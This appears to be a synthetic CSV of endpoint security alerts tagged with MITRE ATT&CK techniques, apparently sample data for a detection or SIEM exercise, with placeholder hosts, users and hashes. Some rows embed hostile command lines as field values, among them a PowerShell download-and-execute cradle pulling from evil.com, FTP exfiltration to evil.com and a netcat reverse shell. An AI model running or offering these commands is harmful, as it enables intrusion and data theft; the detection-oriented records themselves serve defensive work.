45678,,,,,,Suspicious Web Service Connection,Microsoft Defender ATP detected suspicious network activity related to a web service on the endpoint.,,,,,,,,,,,,C:\Windows\System32\svchost.exe -k DcomLaunch,,,,,,,,,,,Medium,,,Behavioral,,,,,,,,,,Microsoft Defender ATP,,,,,,computer01.example.com,,C:\Windows\System32\svchost.exe,,,,192.168.0.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,10.0.0.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-09T09:00:00Z,abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890,W3SVC,C:\Windows\System32\inetsrv\w3wp.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456,,2023-03-10T15:30:00Z,High,Windows Management Instrumentation Execution,,Windows Management Instrumentation Execution,"This alert is triggered when Windows Management Instrumentation (WMI) is used to execute commands or scripts on a system, which is a technique used by attackers to bypass traditional security controls.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,wmiprvse.exe,,,,,JohnDoe,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,endpoint,Defender,C:\Windows\System32\wbem\wmiprvse.exe,DOMAIN,PC12345,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,,2023-03-10T15:30:00Z,,,,Abuse of Elevation Control Mechanism Detected,Abuse of an elevation control mechanism was detected on the following device: {Device_Name}. The user {User_Name} attempted to elevate their privileges without authorization by running {Executable_Name} with elevated privileges.,,,,,,Abuse Elevation Control Mechanism,,,,,,,,,,,,,,,,,High,,,,,Privilege Escalation,,,,,,,,,,,,Privilege Escalation,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{Device_Name},{User_Name},{Executable_Name},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ldkddfgh,,2022-03-07T16:47:13.0000000Z,,,,Access Removal,A privileged account was removed or disabled.,,,,,,,,,,,,,,,,,,,,,,,3,,,Behavior,12345,Threat,,,"{'AlertType': 'Behavior', 'BehaviorName': 'Account Access Removal', 'AlertId': '12345', 'ThreatName': 'Account Access Removal', 'Severity': 'High', 'TimestampUtc': '2022-03-07T16:47:13.0000000Z', 'Tactic': 'Defense Evasion', 'Technique': 'Account Access Removal', 'AffectedEntities': {'User': [{'AccountName': 'example-account', 'SecurityIdentifier': 'S-1-5-21-1234567890-1234567890-1234567890-1001'}]}, 'CommandLine': 'net user example-account /active:no'}",example-hostname,New,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
445566778888,,2023-03-10T14:30:00.000Z,,,,Build Image on Host Detected,The endpoint has detected an attempt to build an image on the host system. This behavior is consistent with the MITRE ATT&CK technique T1612.,,,,Endpoint Detection and Response,,,,,,,,"""C:\Program Files\Docker\Docker\Docker Desktop.exe""",,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,docker,,,,192.168.1.100,,1234,5678,,,,,,,,,,,,,powershell.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Program Files\Docker\Docker\Docker Desktop.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ExampleHost01,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Build Image on Host,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,JohnDoe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
099909,,2022-03-09T09:30:00.0000000Z,,,,Data Manipulation,Suspicious data manipulation activity was detected on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,2,,,Behavior,12345,Suspicious,,,"{'AlertType': 'Behavior', 'BehaviorName': 'Data Manipulation', 'AlertId': '12345', 'ThreatName': 'Data Manipulation', 'Severity': 'Medium', 'TimestampUtc': '2022-03-09T09:30:00.0000000Z', 'MITRE': {'Tactic': ['Defense Evasion'], 'Technique': [{'Id': 'T1565', 'Name': 'Data Manipulation'}]}, 'AffectedEntities': {'Process': [{'ProcessId': 1234, 'ProcessCommandLine': 'C:\\Program Files\\example-app\\example-app.exe', 'ProcessStartTimeUtc': '2022-03-09T09:00:00.0000000Z', 'ProcessParentCommandLine': 'C:\\Windows\\system32\\cmd.exe /c start C:\\Program Files\\example-app\\example-app.exe', 'ProcessParentImageFileName': 'cmd.exe', 'ProcessGrandparentCommandLine': 'C:\\Windows\\system32\\cmd.exe /c start C:\\Program Files\\example-app\\example-app.exe', 'ProcessGrandparentImageFileName': 'cmd.exe'}], 'File': [{'FilePath': 'C:\\Windows\\Temp\\example-file.txt', 'FileName': 'example-file.txt', 'CreateTimeUtc': '2022-03-09T09:15:00.0000000Z', 'ModifyTimeUtc': '2022-03-09T09:20:00.0000000Z', 'SHA256Hash': 'ABC123...'}]}}",example-hostname,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0303345,,2022-04-05T08:32:15Z,,,,deployment of unauthorized container on host,This alert is triggered when an attempt to deploy an unauthorized container is detected on a host.,,,,Container Security,,Deploy Container,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,Host01,/usr/bin/docker,,docker run -itd unauthorized-image:latest,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,john.doe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,unauthorized-image:latest,Docker,docker run,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
99909090,,2023-03-10T12:00:00Z,,,,Execution Guardrails,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,John.Doe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversarys campaign.,ABC123,Workstation-01,192.168.1.100,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0009090,,2023-03-08T14:30:00Z,,,,Exfiltration Over C2 Channel Detected,This alert is triggered when data exfiltration is detected over a Command and Control (C2) channel on an endpoint.,,,,,,,,,,,,powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'),,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,powershell.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,evil.com,SensitiveData.txt,HTTP,DOMAIN,explorer.exe,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
00030505,,2023-03-08T14:30:00Z,,,,Exfiltration Over Other Network Medium,This alert is triggered when data exfiltration is detected over an alternative network medium on an endpoint.,,,,,,,,,,,,explorer.exe ftp://evil.com/SensitiveData.txt,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,SensitiveData.txt,FTP,DOMAIN,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
oeoro5555,,2023-03-08T14:30:00Z,,,,Exfiltration Over Physical Medium ,This alert is triggered when data exfiltration is detected over a physical medium on an endpoint.,,,,,,,,,,,,explorer.exe copy SensitiveData.txt E:\,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,SensitiveData.txt,USB,DOMAIN,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ldsjfjg90,,2023-03-10T14:00:00Z,,,,Hide Artifacts,Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.,,,,,,Hide Artifacts,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,explorer.exe,,,,,,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin,,,Blocked,Attempt to hide malware file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,File,C:\Windows\system32\cmd.exe,malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
234567,,2022-04-05T13:45:00Z,,,,Inter-Process Communication,,,,,,,,,,,,,,,"['Terminate the suspicious processes.', 'Review and block any network traffic associated with these processes.', 'Perform a full system scan to ensure no other malicious processes are running on the system.']",,,,,,,,,High,,,,,,,,,,,"Detected suspicious inter-process communication between Process A and Process B. Process A, a known trusted process, was found communicating with Process B, a command line tool. This is indicative of possible defense evasion and command and control activity. Further investigation is recommended.",,Defender for Endpoint EDR,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MDE-78901,,,Medium,,,Native OS Functions,"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2022-10-31T15:43:21Z,"['NtOpenFile', 'NtCreateFile', 'NtReadFile']",192.168.1.151,192.168.1.150,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-34567,,,High,,,Masked Executable,Masked executable detected on host COMPUTER-123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe /c C:\Users\user\Downloads\example.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Users\user\Downloads\example.exe,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5d41402abc4b2a76b9719d911017c592,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2022-10-31T00:12:34Z,,,,8ce9eaf907aedfcdff2c0a4d77a4c1f0,explorer.exe,e57597d202f73c0f6a4057f3d1a784b7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
6384095-,,2023-03-10T19:00:00Z,,,,Masquerade as a Legitimate Application,"Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.",,,,,,Masquerade as a Legitimate Application,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,explorer.exe,explorer.exe /c C:\Windows\system32\notepad.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,user01,,,Blocked,Process attempted to execute an unauthorized file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0304950,,2023-03-10T20:00:00Z,,,,Modify Registry,"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.",,,,,,Modify Registry,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,desktop01,user01,,,Blocked,Unauthorized modification of registry key,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0902405,,2023-03-09T12:00:00.000000Z,,,,Multi-Stage Command and Control,Detection of multi-stage command and control traffic,,,,,,,,,,,,C:\Windows\System32\svchost.exe -k netsvcs,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,svchost.exe,,,,,,1234,5678,,,,,,,,,,,,,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,TCP,,,,443,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
pr4p5-f,,,,,,Native API,Defender for Endpoint has detected suspicious use of a Native API on the system.,,,,,,Native API (T1106),,,,,,,,,,,,,,,,,High,,,,,System Call,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Analyze the system for any suspicious activities or processes and block the process that was making the suspicious call.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,"Defender for Endpoint detected a process using a Native API function to interact with the operating system. The API function is commonly used by malware to execute commands or perform actions on the system, and can be an indicator of malicious activity.",C:\Windows\explorer.exe,"explorer.exe /root,C:\Windows\system32",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
30340ed0r5,,2023-03-09T12:00:00.000000Z,,,,Non-Application Layer Protocol,Detection of non-application layer protocol traffic,,,,,,,,,,,,C:\Windows\System32\nslookup.exe example.com,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,nslookup.exe,,,,,,1234,5678,,,,,,,,,,,,,cmd.exe,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,,,,,UDP,,,,53,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
203040fd,,2023-03-09T12:00:00.000000Z,,,,Non-Standard Port,Detection of network traffic to a non-standard port,,,,,,,,,,,,C:\Program Files\curl\curl.exe https://example.com:12345,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,curl.exe,,,,,,1234,,,,,,,,,,,,,,cmd.exe,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,,,,,TCP,,,,12345,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0304054d,,2023-03-10T10:30:00Z,,,,Obfuscated Files,Adversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter.,,,,,,Obfuscated Files or Information,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Isolate the affected host and perform a forensic analysis of the file to determine the nature and purpose of the obfuscation.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Program Files\Malware\malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
T1566,,,,,,Potential Phishing Attempt,An email was received with suspicious content and links. The user did not click on any links or respond to the email.,,,,,,,,,,,,,,,,,,,,,,,High,,,Phishing,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-04T13:45:30Z,"{'UserName': 'johndoe', 'UserDisplayName': 'John Doe', 'UserEmail': 'johndoe@example.com', 'UserAgent': 'Microsoft Outlook', 'UserIP': '192.168.1.20'}","{'SenderEmail': 'spoofed@example.com', 'RecipientEmail': 'johndoe@example.com', 'Subject': 'Important: Action Required', 'URLs': ['http://malicious.com', 'http://phishing.com'], 'Attachments': ['invoice.pdf']}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3-04-5-ft5,,2023-03-10T12:00:00Z,,,,Pre-OS Boot,"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system.",,,,,,Pre-OS Boot,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Persistence,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Isolate the affected host and perform a forensic analysis of the pre-OS boot image to determine the nature and purpose of the modification.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\bootmgr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
toeodo56,,2023-03-09T15:30:00Z,,,,Protocol Tunneling,Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another.,,,,,,,,,,,,,Network traffic analysis,"['Isolate affected endpoints', 'Investigate network traffic']",,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Protocol: HTTP over DNS,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['Endpoint1', 'Endpoint2']","['192.168.1.10', '10.0.0.2']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
33440rft,,2023-03-10T15:45:00Z,,,,Reflective Code,.,,,,,,"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk",,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the injected process and loader process to determine the nature and purpose of the reflective code loading activity and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,explorer.exe,,,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,notepad.exe,Reflective DLL Injection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
20345q,,2023-03-09T10:30:00Z,,,,Remote Access,Remote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.,,,,,,,,,,,,nc.exe -e cmd.exe 10.0.0.2 4444,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,nc.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\nc.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,A2D3F4B5C6E7A8B9,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\cmd.exe,B9A8E7C6B5F4D3A2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
pdpdf03r4,,,,,,Scheduled Task,A new scheduled task/job was created or modified on the system.,,,,,,Scheduled Task/Job,,,,,,,,,,,,,,,,,High,,,,,Malware Persistence,,,,,,,,,,,,Persistence,,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,System Process,Task Scheduler,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments).",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
